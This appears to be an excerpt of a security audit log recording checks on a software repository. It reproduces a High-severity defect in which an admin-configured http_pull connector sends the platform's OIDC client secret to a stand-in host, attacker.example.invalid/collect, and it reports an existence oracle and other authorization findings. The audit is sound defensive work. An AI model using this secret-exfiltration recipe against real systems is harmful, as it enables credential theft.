checks_run.procedure: Verify the assignment hash. Make a FULL clone (git clone --no-local: a complete object copy, not shallow, no alternates) in $TMPDIR. Recompute the candidate ID at source commit 3cce3d4 and at freeze commit 60a6b3a5, and in the repository tree, and confirm that the freeze commit adds only delivery records. Then replace the clone with --shared sparse working copies to save shared disk: rv, and later rv2. They omit only the manifest-excluded docs/delivery/{test-evidence,runs} and, for rv only, handbacks. Recompute the ID in each.

Every tree gives sha256:7d6b4a9f…08cb over 2708 files, with exit 0: the repository tree, the full clone at 3cce3d4 and at 60a6b3a5, rv, and rv2 (with handbacks restored). checks_run.procedure: Read the SecretProvider registry, the SecretRef checks and the http_pull adapter. Then reproduce on the real API: an ADM_TECH configures an http_pull connector whose bearer credential names a platform environment variable and whose endpoint is an arbitrary https host, and runs the connector test. Only the network transport is replaced, by a recorder.
checks_run.command: checks.sh repro 40-repro-env-secret-exfil zz-cs-r1-env-secret-exfil.test.ts
checks_run.environment: rv; disposable PostgreSQL; Node v22.22.0; OIDC_CLIENT_SECRET set to a synthetic value in the process environment
checks_run.expected: A reference to a platform runtime secret is refused or unresolvable; nothing is sent
checks_run.actual:
Both creates return 201, and resolvable is true for OIDC_CLIENT_SECRET and false for DATABASE_URL, so the response is an existence oracle. The test call returns 200 'succeeded'. The recorder captured GET https://attacker.example.invalid/collect with 'authorization: Bearer synthetic-oidc-client-secret-cs-r1-7c1e'. See F-DG6-120 (High, mandatory).

The first attempt (attempt1.log, exit 1 by design) put a DATABASE_URL reference in the same map. The test process has no such variable, so the whole call failed before any I/O. Its failing assertion is 'expected [] to have a length of 1'. The final probe separates the oracle from the exfiltration and exits 0, which means the leak was reproduced.

checks_run.environment: rv; disposable PostgreSQL, demo seed (synthetic); Node v22.22.0

checks_run.actual:

- The benefit's own events are redacted true in /audit-events.

Two earlier attempts exited 1:

- attempt2: 'column u.subject does not exist'; the subject is on user_identity.

checks_run.actual: The record answers 404. versions answers 200, comments 200 with both bodies including the TO's restricted one, attachments 200, and POST comments 201. checks_run.command: git diff 660f40c7d141b6fb73c145e0ee7a053ceb5905de..3cce3d4452fcd91e3db2888c60271e5afdc06062 -- apps packages; plus reading the full touched files
checks_run.environment: repository tree (read-only)
checks_run.expected: No authorization, integrity, injection or secret defect beyond those raised
checks_run.actual:
Defects: F-DG6-120 to F-DG6-123 (High) and F-DG6-124 (Low). Without a defect:
- Webhooks: HMAC over timestamp.delivery.body with timingSafeEqual; a tolerance window (CHECK 30-900 s); a replay answered from the stored receipt under an advisory lock, with a unique backstop; a 409 for a reused id with another body; the body limit enforced while streaming; parsing only after the signature; the current/previous secret slot with valid_until.
- OIDC: an exact issuer, audience and azp check after openid-client's own validation; enableNonRepudiationChecks verifies the JWS.
- The preview is raster-only, re-checks the magic bytes and sends CSP sandbox, nosniff, CORP and no-store; SVG is never inline.
- Search applies ReadScope with the sensitivity clause at query time, using live party columns.
- The assistant calls the provider between two transactions, has no tool interface, and its suggestions write only assistant_suggestion.
- An outbound write dispatches outside the transaction, with the same idempotency key.
- runJobBatch settles each job on its own, so exactly-once rests on each handler's locks and unique backstops.
- The engine requires enabled now and the enablement row at the event's occurrence time.
- The webhook list cursor orders and compares on the same millisecond truncation.
- No new dangerouslySetInnerHTML or innerHTML sink.

Observations, not defects:
- the webhook auto-commit acts on behalf of a user chosen by ADM_TECH and re-checks that user's grants at commit (as designed and audited);
- outbound exactly-once relies on the downstream deduplicating by key, as ADR-0055 states;
- the residual commit-order race of ADR-0043 is documented, and its effect is bounded.
